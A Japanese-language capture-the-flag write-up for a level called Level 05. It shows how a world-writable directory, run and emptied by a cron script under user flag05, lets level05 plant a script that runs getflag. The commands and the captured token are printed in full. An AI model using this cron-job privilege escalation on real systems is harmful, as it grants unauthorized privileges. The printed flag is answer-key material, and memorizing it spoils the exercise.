# Level 05

## 目的
ユーザー `flag05` の権限で `getflag` コマンドを実行し、フラグを取得する。

## 手順と解説

### 1. 調査

`level05` ユーザーでログイン後、システム内の `flag05` ユーザーが所有するファイルを検索します。

```bash
find / -user flag05 2>/dev/null
```
出力:
```text
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver
```

見つかったファイル `/usr/sbin/openarenaserver` の中身を確認します。

```bash
cat /usr/sbin/openarenaserver
```
```bash
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```
このスクリプトは、`/opt/openarenaserver/` ディレクトリ内のファイルを順に実行し、その後削除するという動作をしています。
これが `flag05` 権限で定期的に（cronなどで）実行されていると推測できます。

### 2. エクスプロイト（攻撃）

`/opt/openarenaserver/` ディレクトリに書き込み権限があるか確認します。
```bash
ls -ld /opt/openarenaserver
getfacl /opt/openarenaserver
```
ACLにより `level05` ユーザーに `rwx` 権限が付与されていることが確認できました。

攻撃用のスクリプトを作成して配置します。
このスクリプトは、`getflag` を実行し、その結果を `/tmp` に書き出します。

```bash
echo "#!/bin/sh" > /opt/openarenaserver/exploit.sh
echo "/bin/getflag > /tmp/flag05_output" >> /opt/openarenaserver/exploit.sh
chmod +x /opt/openarenaserver/exploit.sh
```

### 3. 待機と確認

cronジョブがスクリプトを実行するのを待ちます。
スクリプトがディレクトリから消えたら実行完了です。

```bash
# スクリプトが消えるまで待機（例）
while [ -f /opt/openarenaserver/exploit.sh ]; do sleep 1; done
```

実行後、出力ファイルを確認します。
```bash
cat /tmp/flag05_output
```
出力:
```text
Check flag.Here is your token : viuaaale9huek52boumoomioc
```

## 結果

### トークン (Flag)
`viuaaale9huek52boumoomioc`
